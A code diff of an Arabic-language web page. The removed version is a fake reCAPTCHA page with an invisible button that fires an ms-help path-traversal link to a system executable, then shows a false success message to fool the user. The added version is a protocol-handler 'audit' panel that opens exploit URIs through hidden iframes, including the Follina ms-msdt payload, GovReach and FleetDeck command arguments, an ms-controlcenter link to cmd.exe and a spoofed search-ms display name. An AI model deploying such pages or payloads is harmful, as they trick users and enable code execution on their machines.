@@ -2,87 +2,113 @@
 <html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <title>تحقق من الأمان</title>
+    <title>Master Protocol Security Lab</title>
     <style>
-        body {
-            background-color: #f4f4f4;
-            font-family: Arial, sans-serif;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-            overflow: hidden;
-        }
-        .captcha-container {
-            background: white;
-            padding: 30px;
-            border-radius: 8px;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
-            text-align: center;
-            width: 350px;
-            position: relative;
-            z-index: 1;
-        }
-        .checkbox-pannel {
-            border: 1px solid #d3d3d3;
-            padding: 15px;
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            background: #f9f9f9;
-            cursor: pointer;
-        }
-        .checkbox {
-            width: 30px;
-            height: 30px;
-            border: 2px solid #c1c1c1;
-            border-radius: 3px;
-            background: white;
-        }
-        /* الطبقة المخفية - المحرك الأساسي */
-        #hidden-trigger {
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            width: 100%;
-            height: 100%;
-            opacity: 0; /* مخفي تماماً ولكن قابل للنقر */
-            cursor: pointer;
-            z-index: 10;
-        }
-        h2 { color: #555; font-size: 18px; }
-        p { color: #888; font-size: 12px; }
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; direction: rtl; padding: 30px; background-color: #1a1a1a; color: #e0e0e0; }
+        .category { background: #2d2d2d; padding: 20px; margin-bottom: 20px; border-radius: 10px; border-right: 5px solid #007bff; }
+        .protocol-item { background: #3d3d3d; padding: 10px; margin: 5px 0; border-radius: 5px; display: flex; justify-content: space-between; align-items: center; }
+        button { background: #28a745; color: white; border: none; padding: 8px 15px; border-radius: 4px; cursor: pointer; font-weight: bold; }
+        button:hover { background: #218838; }
+        h2 { color: #ffc107; border-bottom: 1px solid #444; padding-bottom: 10px; }
+        .danger { background: #dc3545 !important; }
+        code { color: #00ff00; background: #000; padding: 2px 4px; }
     </style>
 </head>
 <body>
 
-    <div class="captcha-container">
-        <h2>التحقق من أنك لست برنامج روبوت</h2>
-        <div class="checkbox-pannel">
-            <div class="checkbox"></div>
-            <span style="font-size: 14px; color: #555;">أنا لست برنامج روبوت</span>
-            <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" width="30">
+    <h1>لوحة تحكم فحص البروتوكولات (Security Audit)</h1>
+    <p>هذه الصفحة مخصصة لفحص كيف يتعامل نظام التشغيل مع طلبات البروتوكول من المتصفح.</p>
+
+    <div class="category">
+        <h2>1. أدوات التحكم والعمل عن بُعد (Remote Admin)</h2>
+        <div class="protocol-item">
+            <span><code>fleetdeck://</code> - FleetDeck Commander Launcher</span>
+            <button onclick="launch('fleetdeck://test --args \"whoami\"')">فحص FleetDeck</button>
         </div>
-        <p>بضغطك على المربع، أنت توافق على شروط الخدمة</p>
-        
-        <button id="hidden-trigger" onclick="triggerSystem()">Verify</button>
+        <div class="protocol-item">
+            <span><code>GovReach://</code> - Goverlan Reach Console</span>
+            <button onclick="launch('GovReach://-execute notepad.exe')">فحص GovReach</button>
+        </div>
+        <div class="protocol-item">
+            <span><code>zocom://</code> - 01Launcher (IIT)</span>
+            <button onclick="launch('zocom://test')">فحص Zocom</button>
+        </div>
+    </div>
+
+    <div class="category">
+        <h2>2. أدوات النظام والتشخيص (Windows System)</h2>
+        <div class="protocol-item">
+            <span><code>ms-msdt://</code> - Microsoft Support Diagnostic Tool</span>
+            <button class="danger" onclick="launch('ms-msdt:-id ITW_Diagnostic -skip true -param \"IT_RevengePayload=calc.exe\"')">تشغيل MSDT (Follina)</button>
+        </div>
+        <div class="protocol-item">
+            <span><code>ms-controlcenter://</code> - Windows Control Center</span>
+            <button onclick="launch('ms-controlcenter://url=C:\\Windows\\System32\\cmd.exe')">فحص Control Center</button>
+        </div>
+        <div class="protocol-item">
+            <span><code>ms-mmsys://</code> - Sound Settings (Rundll32)</span>
+            <button onclick="launch('ms-mmsys://test')">فحص MS-MMSys</button>
+        </div>
+        <div class="protocol-item">
+            <span><code>WdMam://</code> - Security Health Host</span>
+            <button onclick="launch('WdMam://test')">فحص WdMam</button>
+        </div>
+    </div>
+
+    <div class="category">
+        <h2>3. الاتصالات والشبكات (Terminal & Network)</h2>
+        <div class="protocol-item">
+            <span><code>telnet://</code> - Telnet Protocol Handler</span>
+            <button onclick="launch('telnet://127.0.0.1')">فتح Telnet</button>
+        </div>
+        <div class="protocol-item">
+            <span><code>rlogin://</code> - Rlogin Handler</span>
+            <button onclick="launch('rlogin://127.0.0.1')">فتح Rlogin</button>
+        </div>
+        <div class="protocol-item">
+            <span><code>LDAP://</code> - Windows Mail (WAB)</span>
+            <button onclick="launch('LDAP://127.0.0.1')">فحص LDAP</button>
+        </div>
+    </div>
+
+    <div class="category">
+        <h2>4. المراسلة والتصفح (Communication)</h2>
+        <div class="protocol-item">
+            <span><code>tg://</code> - Telegram Desktop</span>
+            <button onclick="launch('tg://resolve?domain=test')">فحص Telegram</button>
+        </div>
+        <div class="protocol-item">
+            <span><code>mailto://</code> - Thunderbird Mail</span>
+            <button onclick="launch('mailto:test@example.com?subject=test')">فحص Mailto</button>
+        </div>
+        <div class="protocol-item">
+            <span><code>microsoft-edge://</code> - MS Edge</span>
+            <button onclick="launch('microsoft-edge:http://127.0.0.1')">فتح Edge</button>
+        </div>
+    </div>
+
+    <div class="category">
+        <h2>5. البحث وإدارة الملفات (Shell)</h2>
+        <div class="protocol-item">
+            <span><code>search-ms://</code> - Windows Search</span>
+            <button onclick="launch('search-ms:query=test&displayname=SecurityUpdate')">فحص Search-MS</button>
+        </div>
+        <div class="protocol-item">
+            <span><code>calculator://</code> - Win32 Calc</span>
+            <button onclick="launch('calculator://test')">فتح الآلة الحاسبة</button>
+        </div>
     </div>
 
     <script>
-        function triggerSystem() {
-            // محاولة استغلال بروتوكول المساعدة لتنفيذ أمر
-            // في عام 2026، هذا سيظهر نافذة "Allow" في المتصفح 
-            // وبما أن المستخدم ضغط بالفعل، فإنه غالباً سيضغط "Allow" سريعاً
-            window.location.href = "ms-help:////../windows/system32/calc.exe";
-            
-            // تغيير الواجهة بعد الضغط لإيهام المستخدم بالنجاح
-            document.querySelector('.checkbox').innerHTML = "✔️";
-            document.querySelector('.checkbox').style.borderColor = "green";
-            alert("تم التحقق بنجاح!");
+        function launch(url) {
+            console.log("Launching: " + url);
+            // فتح البروتوكول في نافذة مخفية عشان الصفحة متقفلش
+            let iframe = document.createElement('iframe');
+            iframe.style.display = 'none';
+            iframe.src = url;
+            document.body.appendChild(iframe);
+            setTimeout(() => document.body.removeChild(iframe), 2000);
         }
     </script>
-
 </body>
 </html>
